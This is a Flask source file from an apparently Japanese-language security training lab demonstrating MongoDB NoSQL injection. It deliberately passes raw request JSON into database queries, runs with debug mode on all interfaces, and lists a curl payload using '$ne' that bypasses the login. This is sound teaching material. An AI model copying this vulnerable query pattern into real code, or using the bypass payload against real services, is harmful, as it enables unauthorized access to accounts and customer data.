"""
PoC⑥: MongoDB NoSQL injection（脆弱版）

JSONリクエストをそのままMongoDBの検索条件に渡しているため、文字列値ではなく
{"$ne": null} などの条件オブジェクトを混入できる。
"""
import os
import json
import time

from flask import Flask, jsonify, render_template_string, request
from pymongo import MongoClient
from pymongo.errors import PyMongoError


MONGO_URI = os.environ.get("MONGO_URI", "mongodb://127.0.0.1:27017")
DB_NAME = "nosql_training"


def get_db():
    for _ in range(30):
        try:
            client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=1000)
            client.admin.command("ping")
            return client[DB_NAME]
        except PyMongoError:
            time.sleep(1)
    raise RuntimeError("MongoDB is not ready")


def seed_db():
    db = get_db()
    db.users.delete_many({})
    db.customers.delete_many({})
    db.users.insert_many(
        [
            {"username": "admin", "password": "Mongo-Admin-Pass-2026!", "role": "admin"},
            {"username": "alice", "password": "alicepw123", "role": "user"},
        ]
    )
    db.customers.insert_many(
        [
            {"name": "佐藤", "email": "sato.customer@example.test", "total": 128000},
            {"name": "鈴木", "email": "suzuki.customer@example.test", "total": 54800},
            {"name": "高橋", "email": "takahashi.customer@example.test", "total": 23900},
        ]
    )


app = Flask(__name__)
seed_db()

PAGE = """
<h2>MongoDBログイン/API（脆弱版 / PoC⑥）</h2>
<p>JSON本文をそのままMongoDBクエリに渡すと、値ではなく条件式を差し込まれることがあります。</p>
<h3>通常ログイン</h3>
<pre>curl -s -X POST http://127.0.0.1:5006/login \\
  -H 'Content-Type: application/json' \\
  -d '{"username":"admin","password":"wrong"}'</pre>
<h3>NoSQL injection</h3>
<pre>curl -s -X POST http://127.0.0.1:5006/login \\
  -H 'Content-Type: application/json' \\
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'</pre>
<h3>顧客API</h3>
<pre>curl -s 'http://127.0.0.1:5006/api/customers?filter={"total":{"$gt":0}}'</pre>
"""


@app.route("/")
def index():
    return render_template_string(PAGE)


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(force=True, silent=True) or {}
    db = get_db()

    # 脆弱ポイント: JSONをそのまま検索条件にしている
    user = db.users.find_one(data, {"_id": 0})
    if user:
        return jsonify({"ok": True, "message": "ログイン成功", "user": user, "query": data})
    return jsonify({"ok": False, "message": "ログイン失敗", "query": data}), 401


@app.route("/api/customers")
def customers():
    raw_filter = request.args.get("filter", "{}")
    db = get_db()
    try:
        # 講義用にeval相当の危険を避けるため、FlaskのJSON parserだけを使う
        parsed = request.args.get("filter")
        query = {} if not parsed else json.loads(parsed)
        rows = list(db.customers.find(query, {"_id": 0}))
        return jsonify({"query": query, "rows": rows})
    except Exception as exc:
        return jsonify({"error": str(exc), "raw_filter": raw_filter}), 400


if __name__ == "__main__":
    port = int(os.environ.get("APP_PORT", "5006"))
    app.run(host="0.0.0.0", debug=True, port=port)
